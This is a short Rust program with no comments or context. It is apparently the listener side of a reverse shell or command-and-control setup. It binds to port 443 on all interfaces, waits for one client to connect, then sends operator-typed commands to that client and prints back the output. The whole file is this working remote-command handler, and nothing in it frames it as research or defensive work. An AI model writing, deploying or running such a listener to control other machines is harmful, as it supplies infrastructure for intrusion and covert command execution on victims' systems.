use std::io::{self, BufRead, BufReader, Write};
use std::net::{TcpListener, TcpStream};

const LISTEN_ADDRESS: &str = "0.0.0.0:443";

fn handle_client(mut stream: TcpStream) -> io::Result<()> {
    let mut reader = BufReader::new(stream.try_clone()?);

    let stdin = io::stdin();
    let mut stdin_lock = stdin.lock();

    println!("Client connected: {}", stream.peer_addr()?);

    let mut input_buffer = String::new();
    loop {
        input_buffer.clear();
        print!("Enter command to run on client (or 'exit' to quit): ");
        io::stdout().flush()?;
        if stdin_lock.read_line(&mut input_buffer)? == 0 {
            break;
        }
        let command = input_buffer.trim();
        if command.is_empty() {
            continue;
        }
        if command.eq_ignore_ascii_case("exit") {
            println!("Exiting server...");
            break;
        }

        stream.write_all(command.as_bytes())?;
        stream.write_all(b"\n")?;

        let mut response = String::new();
        loop {
            let mut line = String::new();
            let n = reader.read_line(&mut line)?;
            if n == 0 || line.trim().is_empty() {
                break;
            }
            response.push_str(&line);
        }

        println!("Response from client:\n{}", response);
    }
    Ok(())
}

fn main() -> io::Result<()> {
    let listener = TcpListener::bind(LISTEN_ADDRESS)?;
    println!("Server listening on {LISTEN_ADDRESS}...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                if let Err(e) = handle_client(stream) {
                    eprintln!("Connection error: {}", e);
                }
                break;
            }
            Err(e) => {
                eprintln!("Failed to accept client: {}", e);
            }
        }
    }
    println!("Server shutting down.");
    Ok(())
}
